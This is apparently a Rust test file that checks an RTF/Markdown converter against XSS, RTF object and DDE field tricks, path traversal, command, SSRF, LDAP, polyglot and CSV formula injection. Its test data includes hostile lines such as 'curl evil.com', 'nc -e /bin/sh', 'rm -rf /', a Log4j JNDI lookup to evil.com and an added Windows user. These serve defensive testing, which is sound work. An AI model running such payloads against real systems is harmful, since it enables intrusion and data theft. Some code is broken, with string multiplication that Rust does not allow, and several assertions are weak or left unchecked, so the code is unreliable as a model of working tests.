// Injection attack tests for RTF/Markdown conversion
//
// Tests protection against various injection attacks including
// XSS, command injection, path traversal, and code execution attempts

#[cfg(test)]
mod injection_tests {
    use crate::conversion::{
        rtf_to_markdown,
        markdown_to_rtf,
        input_validation::InputValidator,
        secure_parser::SecureRtfParser,
        rtf_lexer::tokenize,
    };
    use std::path::Path;

    #[test]
    fn test_rtf_control_word_injection() {
        // Test dangerous RTF control words that could enable attacks
        let dangerous_controls = vec![
            // Object embedding
            (r"{\rtf1 {\object\objemb\objw100\objh100} Normal text}", "object embedding"),
            (r"{\rtf1 {\objdata 504B0304} Hidden data}", "object data"),
            (r"{\rtf1 {\*\objclass Word.Document.12} Doc}", "object class"),
            
            // Picture/binary data injection
            (r"{\rtf1 {\pict\wmetafile8\bin 4D5A90} Image}", "binary executable header"),
            (r"{\rtf1 {\*\pn\pnlvlblt\pnf1{\pntxtb \'B7}}}", "bullet with binary"),
            
            // Field codes that could execute
            (r"{\rtf1 {\field{\*\fldinst{INCLUDE C:\\boot.ini}}}}", "file inclusion"),
            (r"{\rtf1 {\field{\*\fldinst{DDE cmd '/c calc.exe'}}}}", "DDE execution"),
            (r"{\rtf1 {\field{\*\fldinst{HYPERLINK 'file:///etc/passwd'}}}}", "file URL"),
            
            // Template/macro references
            (r"{\rtf1 {\*\template C:\\malicious.dot}}", "template reference"),
            (r"{\rtf1 {\docvar{macro}{Sub AutoOpen()}}", "macro definition"),
            
            // Result control hiding malicious content
            (r"{\rtf1 Safe{\result\object\objdata} text}", "hidden object in result"),
            
            // Data store/custom XML
            (r"{\rtf1 {\*\datastore\data <script>alert(1)</script>}}", "datastore injection"),
            
            // Revision/comment injection
            (r"{\rtf1 {\*\revtbl{\rev\revauth1 Hacker;}}}", "revision author"),
            (r"{\rtf1 {\*\atnid evil}{\*\annotation\pard Malicious}}", "annotation"),
        ];

        let validator = InputValidator::new();
        
        for (rtf, attack_type) in dangerous_controls {
            let result = validator.pre_validate_rtf(rtf);
            assert!(
                result.is_err(),
                "Should block {}: {}", attack_type, rtf
            );
            
            // Also test parser level
            if let Ok(tokens) = tokenize(rtf) {
                let parse_result = SecureRtfParser::parse(tokens);
                assert!(
                    parse_result.is_err(),
                    "Parser should block {}", attack_type
                );
            }
        }
    }

    #[test]
    fn test_markdown_xss_injection() {
        let xss_payloads = vec![
            // Script tags
            ("<script>alert('XSS')</script>", "basic script"),
            ("<script src='http://evil.com/xss.js'></script>", "external script"),
            ("<ScRiPt>alert(1)</ScRiPt>", "mixed case script"),
            
            // Event handlers
            ("<img src=x onerror='alert(1)'>", "img onerror"),
            ("<body onload='alert(1)'>", "body onload"),
            ("<svg onload='alert(1)'></svg>", "svg onload"),
            ("<input onfocus='alert(1)' autofocus>", "input autofocus"),
            
            // Javascript URLs
            ("[Click](javascript:alert(1))", "javascript URL in link"),
            ("![](javascript:alert(1))", "javascript URL in image"),
            ("<a href='javascript:void(0)'>Click</a>", "javascript void"),
            
            // Data URLs with scripts
            ("![](data:text/html,<script>alert(1)</script>)", "data URL script"),
            ("[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)", "base64 script"),
            
            // Malicious iframes
            ("<iframe src='javascript:alert(1)'></iframe>", "iframe javascript"),
            ("<iframe srcdoc='<script>alert(1)</script>'></iframe>", "iframe srcdoc"),
            
            // CSS injection
            ("<style>body{background:url('javascript:alert(1)')}</style>", "CSS javascript"),
            ("<div style='background-image:url(javascript:alert(1))'>", "inline CSS"),
            
            // Meta refresh
            ("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "meta refresh"),
            
            // Form action
            ("<form action='javascript:alert(1)'><input type='submit'></form>", "form action"),
            
            // Object/embed
            ("<object data='javascript:alert(1)'></object>", "object javascript"),
            ("<embed src='javascript:alert(1)'>", "embed javascript"),
        ];

        let validator = InputValidator::new();
        
        for (payload, attack_type) in xss_payloads {
            let result = validator.pre_validate_markdown(payload);
            assert!(
                result.is_err(),
                "Should block {} XSS: {}", attack_type, payload
            );
            
            // Test conversion too
            let rtf_result = markdown_to_rtf(payload);
            if rtf_result.is_ok() {
                let rtf = rtf_result.unwrap();
                assert!(
                    !rtf.contains("javascript:") && !rtf.contains("<script"),
                    "Conversion should sanitize {}", attack_type
                );
            }
        }
    }

    #[test]
    fn test_path_traversal_injection() {
        let validator = InputValidator::new();
        let base_path = Path::new("/safe/upload/dir");
        
        let traversal_attempts = vec![
            // Classic traversal
            ("../../../etc/passwd", "unix traversal"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows traversal"),
            
            // Encoded traversal
            ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded"),
            ("..%252f..%252fetc%252fpasswd", "double encoded"),
            ("%2e%2e%5c%2e%2e%5cwindows", "mixed encoding"),
            
            // Unicode/UTF-8 tricks
            ("..%c0%af..%c0%afetc/passwd", "overlong UTF-8"),
            ("..%u2216..%u2216etc/passwd", "Unicode encoding"),
            ("\u2026/\u2026/etc/passwd", "Unicode dots"),
            
            // Null byte injection
            ("../../../etc/passwd\0.rtf", "null byte suffix"),
            ("safe.rtf\0/../../etc/passwd", "null byte prefix"),
            ("%00../../../etc/passwd", "encoded null"),
            
            // Absolute paths
            ("/etc/passwd", "unix absolute"),
            ("C:\\Windows\\System32\\cmd.exe", "windows absolute"),
            ("\\\\server\\share\\file", "UNC path"),
            
            // Special sequences
            (".../.../...//etc/passwd", "triple dots"),
            ("..;/..;/..;/etc/passwd", "semicolon variant"),
            (".../...\\...\\/etc/passwd", "mixed separators"),
            
            // Long paths
            ("../" * 100 + "etc/passwd", "excessive traversal"),
            ("A" * 255 + "/../etc/passwd", "long prefix"),
            
            // Special files
            ("CON", "windows device"),
            ("PRN", "windows printer"),
            ("NUL", "windows null device"),
            ("/dev/zero", "unix device"),
        ];

        for (path, attack_type) in traversal_attempts {
            let result = validator.sanitize_path(path, Some(base_path));
            
            if let Ok(sanitized) = result {
                // Check sanitized path is within base directory
                assert!(
                    sanitized.starts_with(base_path),
                    "{} should be contained: {:?}", attack_type, sanitized
                );
                
                // Check dangerous patterns removed
                let path_str = sanitized.to_string_lossy();
                assert!(
                    !path_str.contains("..") && 
                    !path_str.contains("//") &&
                    !path_str.contains("\\\\"),
                    "{} should be cleaned: {}", attack_type, path_str
                );
            } else {
                // Some paths should be rejected entirely
                println!("Rejected {}: {}", attack_type, path);
            }
        }
    }

    #[test]
    fn test_command_injection_patterns() {
        // Test for command injection patterns in various contexts
        let command_patterns = vec![
            // Shell metacharacters
            ("text; rm -rf /", "semicolon command"),
            ("text && curl evil.com", "double ampersand"),
            ("text || wget evil.com", "double pipe"),
            ("text | nc -e /bin/sh", "pipe netcat"),
            ("text `whoami`", "backtick execution"),
            ("text $(cat /etc/passwd)", "dollar execution"),
            
            // Windows commands
            ("text & dir C:\\", "single ampersand"),
            ("text && net user hacker /add", "windows user add"),
            ("text | powershell.exe", "powershell pipe"),
            
            // Escape sequences
            ("text\nrm -rf /", "newline injection"),
            ("text\r\ndel *.*", "CRLF injection"),
            ("text\\x0arm -rf", "hex escape"),
        ];

        for (pattern, attack_type) in command_patterns {
            // These patterns should be escaped or rejected in any user input
            let rtf = format!(r"{{\rtf1 {}}}", pattern);
            let markdown = pattern.to_string();
            
            // Test RTF
            let rtf_result = rtf_to_markdown(&rtf);
            if let Ok(output) = rtf_result {
                assert!(
                    !output.contains(';') || !output.contains("rm"),
                    "RTF should sanitize {}", attack_type
                );
            }
            
            // Test Markdown
            let md_result = markdown_to_rtf(&markdown);
            if let Ok(output) = md_result {
                assert!(
                    !output.contains(';') || !output.contains("rm"),
                    "Markdown should sanitize {}", attack_type
                );
            }
        }
    }

    #[test]
    fn test_polyglot_file_injection() {
        // Test files that could be interpreted as multiple formats
        let polyglots = vec![
            // RTF with embedded formats
            (r"{\rtf1 %PDF-1.4 PDF header}", "PDF polyglot"),
            (r"{\rtf1 <?xml version='1.0'?><svg>", "XML/SVG polyglot"),
            (r"{\rtf1 <html><script>", "HTML polyglot"),
            (r"{\rtf1 GIF89a binary data}", "GIF polyglot"),
            (r"{\rtf1 MZ\x90\x00 PE header}", "PE executable"),
            
            // Markdown with embedded content
            ("![](x)<?php system($_GET['cmd']); ?>", "PHP in markdown"),
            ("<%= exec('whoami') %>", "ERB template"),
            ("{{7*7}}", "template injection"),
            ("${jndi:ldap://evil.com/a}", "Log4j style"),
        ];

        let validator = InputValidator::new();
        
        for (content, poly_type) in polyglots {
            let rtf_result = validator.pre_validate_rtf(content);
            let md_result = validator.pre_validate_markdown(content);
            
            assert!(
                rtf_result.is_err() || md_result.is_err(),
                "Should detect {} polyglot", poly_type
            );
        }
    }

    #[test]
    fn test_ssrf_injection_patterns() {
        // Test Server-Side Request Forgery patterns
        let ssrf_patterns = vec![
            // Local network access
            ("http://localhost/admin", "localhost"),
            ("http://127.0.0.1:8080", "loopback"),
            ("http://[::1]/", "IPv6 loopback"),
            ("http://169.254.169.254/", "AWS metadata"),
            ("http://192.168.1.1/", "private network"),
            ("http://10.0.0.1/", "private network"),
            
            // File URLs
            ("file:///etc/passwd", "file protocol"),
            ("file://C:/Windows/win.ini", "windows file"),
            
            // Other protocols
            ("gopher://localhost/", "gopher protocol"),
            ("dict://localhost/", "dict protocol"),
            ("ftp://internal/", "ftp protocol"),
            ("sftp://internal/", "sftp protocol"),
            
            // Encoded variants
            ("http://2130706433/", "decimal IP"),
            ("http://0x7f.0x0.0x0.0x1/", "hex IP"),
            ("http://0177.0.0.01/", "octal IP"),
        ];

        for (url, pattern_type) in ssrf_patterns {
            let rtf = format!(r"{{\rtf1 \field{{\fldinst{{HYPERLINK '{}'}}}}}}", url);
            let markdown = format!("[Link]({})", url);
            
            // Should block or sanitize dangerous URLs
            let validator = InputValidator::new();
            
            // URLs pointing to local resources should be blocked
            if url.contains("localhost") || url.contains("127.0.0.1") || 
               url.contains("169.254") || url.starts_with("file:") {
                let rtf_result = validator.pre_validate_rtf(&rtf);
                let md_result = validator.pre_validate_markdown(&markdown);
                
                assert!(
                    rtf_result.is_err() || md_result.is_err(),
                    "Should block {} SSRF", pattern_type
                );
            }
        }
    }

    #[test]
    fn test_ldap_injection_patterns() {
        // Test LDAP injection patterns that might appear in fields
        let ldap_patterns = vec![
            ("admin)(uid=*))(|(uid=*", "LDAP filter break"),
            ("*)(mail=*))%00", "null byte LDAP"),
            ("admin))((", "parenthesis injection"),
            (r"admin\2a", "escaped wildcard"),
        ];

        for (pattern, attack) in ldap_patterns {
            // These should be escaped if used in any LDAP context
            let rtf = format!(r"{{\rtf1 \field{{\*\username {}}}}}", pattern);
            
            let result = rtf_to_markdown(&rtf);
            if let Ok(output) = result {
                // Should not contain unescaped LDAP metacharacters
                assert!(
                    !output.contains(")(") || !output.contains("*)"),
                    "Should escape {} pattern", attack
                );
            }
        }
    }

    #[test]
    fn test_csv_formula_injection() {
        // Test CSV injection patterns that could execute in spreadsheets
        let csv_patterns = vec![
            ("=1+1", "basic formula"),
            ("=cmd|'/c calc.exe'", "command execution"),
            ("+1+1", "plus formula"),
            ("-1+1", "minus formula"),
            ("@SUM(1+1)", "at formula"),
            ("=HYPERLINK(\"http://evil.com\")", "hyperlink"),
            ("=IMPORTDATA(\"http://evil.com/data\")", "import data"),
        ];

        for (pattern, attack) in csv_patterns {
            let rtf = format!(r"{{\rtf1 {}}}", pattern);
            let markdown = format!("| {} |", pattern);
            
            // Formula patterns should be escaped
            let rtf_result = rtf_to_markdown(&rtf);
            let md_result = markdown_to_rtf(&markdown);
            
            if let Ok(output) = rtf_result {
                assert!(
                    !output.starts_with('=') && !output.starts_with('+') && !output.starts_with('-'),
                    "Should escape {} formula", attack
                );
            }
        }
    }
}